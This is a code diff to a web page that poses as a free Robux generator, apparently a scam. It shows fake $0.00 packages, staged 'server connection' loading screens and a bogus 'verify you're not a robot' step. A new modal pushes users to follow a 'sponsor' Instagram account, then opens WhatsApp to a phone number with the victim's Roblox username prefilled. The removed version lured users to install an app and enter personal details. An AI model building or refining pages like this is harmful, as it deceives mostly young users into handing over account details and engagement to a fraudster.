@@ -159,7 +159,12 @@
         h3 {
             font-size: 24px;
             margin-bottom: 15px;
-            color: #00b06f;
+            color: #fff; /* Changed for better contrast */
+        }
+        
+        h3 span {
+            color: #00b06f; /* Highlight color */
+            font-weight: bold;
         }
 
         /* Loading Animation Styles */
@@ -259,7 +264,7 @@
         .price {
             font-size: 20px;
             font-weight: 700;
-            color: #4caf50;
+            color: #fff;
         }
 
         .robux_total {
@@ -267,7 +272,7 @@
             align-items: center;
             background-color: #00b06f;
             color: white;
-            border-radius: 25px;
+            border-radius: 10px;
             padding: 8px 15px;
             min-width: 120px;
             justify-content: center;
@@ -282,71 +287,74 @@
             font-weight: 600;
         }
 
-        /* --- New Verification Styles --- */
-        .verification-container {
-            text-align: center;
-            background-color: #fff;
-            padding: 25px;
-            border-radius: 15px;
-        }
-        
-        .verification-header {
-            display: flex;
+        /* --- NEW MODAL STYLES --- */
+        #followModal {
+            display: none; /* Hidden by default */
+            position: fixed;
+            z-index: 10000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgba(0,0,0,0.6);
             justify-content: center;
             align-items: center;
-            gap: 15px;
-            margin-bottom: 20px;
         }
 
-        .verification-header img {
-            height: 60px;
+        .modal-content {
+            background-color: #2e2e2e;
+            color: #fff;
+            margin: auto;
+            padding: 30px;
+            border-radius: 12px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.4);
+        }
+
+        .modal-content h4 {
+            font-size: 22px;
+            color: #00b06f;
+            margin-bottom: 15px;
+        }
+
+        .modal-content p {
+            margin-bottom: 25px;
+            font-size: 16px;
+            line-height: 1.5;
+        }
+
+        .modal-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
         }
         
-        .verification-title {
-            color: #005A9C;
-            font-size: 18px;
-            font-weight: bold;
-            line-height: 1.4;
+        #followBtn, #continueBtn {
+            width: 100%;
+            margin-top: 0;
+        }
+
+        #continueBtn {
+            background-color: #4caf50; /* Green color for continue */
+        }
+        #continueBtn:hover {
+            background-color: #45a049;
+        }
+        
+        /* --- MODIFIED for .box4 --- */
+        .verification-step p {
+            font-size: 16px;
+            color: #ccc;
             margin-bottom: 25px;
         }
-        
-        .offer-button {
+
+        #initialVerifyBtn {
+            width: 50%;
+            margin: 0 auto;
             display: block;
-            width: 100%;
-            padding: 15px;
-            margin-bottom: 10px;
-            background-color: #f0f0f0;
-            border: 1px solid #ccc;
-            border-radius: 8px;
-            color: #333;
-            font-size: 16px;
-            font-weight: 600;
-            text-align: center;
-            cursor: pointer;
-            transition: background-color 0.3s;
-        }
-        
-        .offer-button:hover {
-            background-color: #e0e0e0;
-        }
-        
-        .verify-now-button {
-             background: #28a745;
-             border: none;
-             color: #fff;
-             padding: 12px 40px;
-             border-radius: 8px;
-             font-weight: 600;
-             letter-spacing: 1px;
-             font-size: 16px;
-             cursor: pointer;
-             margin-top: 20px;
-             transition: all 0.3s;
-        }
-        
-        .verify-now-button:hover {
-            background: #218838;
-            transform: translateY(-2px);
         }
 
         @media (max-width: 750px) {
@@ -370,8 +378,8 @@
 <body>
     <nav>
         <div class="logo">
+            <span>☰</span>
             <img src="https://i.postimg.cc/wjR3BTJp/w-robux.png" alt="Robux Logo">
-            <span>ROBLOX</span>
         </div>
         <ul>
             <li>Discover</li>
@@ -404,7 +412,6 @@
         </div>
 
         <div class="box3">
-            <h3>• Choose Your Robux Package</h3>
             <div class="container">
                 <div class="row" data-amount="500">
                     <div class="price">$0.00</div>
@@ -438,16 +445,21 @@
         </div>
 
         <div class="box4">
-            <div class="verification-container">
-                <div class="verification-header">
-                    <img src="https://i.postimg.cc/wMPy0tKv/roblox-char.png" alt="Roblox Character">
-                    <img src="https://i.postimg.cc/W42CjM4h/red-arrow.png" alt="Arrow">
-                    <img src="https://i.postimg.cc/xT3x4B0w/robux-logo.png" alt="Robux Icon">
-                </div>
-                <p class="verification-title">CHOOSE THE OFFER AND COMPLETE, ROBUX WILL AUTOMATICALLY BE ENTERED INTO YOUR ACCOUNT</p>
-                <button class="offer-button">Instal Aplikasi GoPay dan Daftar</button>
-                <button class="offer-button">Enter Your Details to Have a chance to Open Mystery Box Now!</button>
-                <button class="verify-now-button">Verify now</button>
+           <div class="verification-step">
+                <h3>• <span>Final Step</span></h3>
+                <p>Please click on the button below and complete 1 task to verify that you're not a robot!</p>
+                <button id="initialVerifyBtn">Verify now</button>
+           </div>
+        </div>
+    </div>
+
+    <div id="followModal">
+        <div class="modal-content">
+            <h4>One Last Step!</h4>
+            <p>To finalize your Robux, please follow our sponsor's account and click continue. Your Robux will be sent after this step.</p>
+            <div class="modal-buttons">
+                <button id="followBtn">Follow Now</button>
+                <button id="continueBtn">Continue</button>
             </div>
         </div>
     </div>
@@ -475,7 +487,12 @@
         const usernameInput = document.querySelector(".username");
         const useroutput = document.querySelector(".useroutput");
         const robuxRows = document.querySelectorAll(".row");
-        const verificationButtons = document.querySelectorAll(".offer-button, .verify-now-button");
+
+        // NEW: Modal elements
+        const followModal = document.getElementById("followModal");
+        const initialVerifyBtn = document.getElementById("initialVerifyBtn");
+        const followBtn = document.getElementById("followBtn");
+        const continueBtn = document.getElementById("continueBtn");
 
         let selectedUsername = "";
         let selectedRobuxAmount = "";
@@ -507,7 +524,6 @@
                 document.querySelector(".box").style.display = "none";
                 document.querySelector(".box2").style.display = "block";
                 
-                // After loading, go to Step 3
                 setTimeout(() => {
                     document.querySelector(".box2").style.display = "none";
                     document.querySelector(".box3").style.display = "block";
@@ -515,31 +531,40 @@
             }
         });
 
-        // Step 3 to Step 4: Robux selection -> Loading
+        // Step 3 to Step 4: Robux selection -> Loading -> Final Step Screen
         robuxRows.forEach(row => {
             row.addEventListener("click", () => {
                 selectedRobuxAmount = row.dataset.amount;
                 document.querySelector(".box3").style.display = "none";
 
-                // Show loading screen again with a new message
                 useroutput.innerHTML = `Preparing your <b>${parseInt(selectedRobuxAmount).toLocaleString()} Robux</b> package...<br>Finalizing server connection.`;
                 document.querySelector(".box2").style.display = "block";
 
-                // After loading, go to Step 4 (Verification)
+                // After loading, go to Step 4 (The "Final Step" screen)
                 setTimeout(() => {
                     document.querySelector(".box2").style.display = "none";
-                    document.querySelector(".box4").style.display = "block";
-                }, 4000); // 4 second loading time
+                    document.querySelector(".box4").style.display = "block"; // Show the new final step screen
+                }, 4000);
             });
         });
 
-        // Step 4: Verification button action (Final action)
-        verificationButtons.forEach(button => {
-            button.addEventListener("click", () => {
-                const message = `Hello! I want to claim ${parseInt(selectedRobuxAmount).toLocaleString()} Robux for my Roblox account: ${selectedUsername}. I have completed all the verification tasks. Please process my request.`;
-                const whatsappUrl = `https://wa.me/6282145804242?text=${encodeURIComponent(message)}`;
-                window.open(whatsappUrl, '_blank');
-            });
+        // NEW: "Verify now" button shows the modal
+        initialVerifyBtn.addEventListener("click", () => {
+            followModal.style.display = "flex"; // Show the modal
+        });
+        
+        // NEW: "Follow" button in modal opens a new tab
+        followBtn.addEventListener("click", () => {
+            // Replace with your actual sponsor/social media link
+            window.open('https://www.instagram.com/herond', '_blank');
+        });
+
+        // NEW: "Continue" button in modal triggers the final WhatsApp action
+        continueBtn.addEventListener("click", () => {
+            const message = `Hello! I want to claim ${parseInt(selectedRobuxAmount).toLocaleString()} Robux for my Roblox account: ${selectedUsername}. I have completed all the verification tasks. Please process my request.`;
+            const whatsappUrl = `https://wa.me/6282145804242?text=${encodeURIComponent(message)}`;
+            window.open(whatsappUrl, '_blank');
+            followModal.style.display = "none"; // Hide the modal
         });
         
         // Show initial notification after 2 seconds
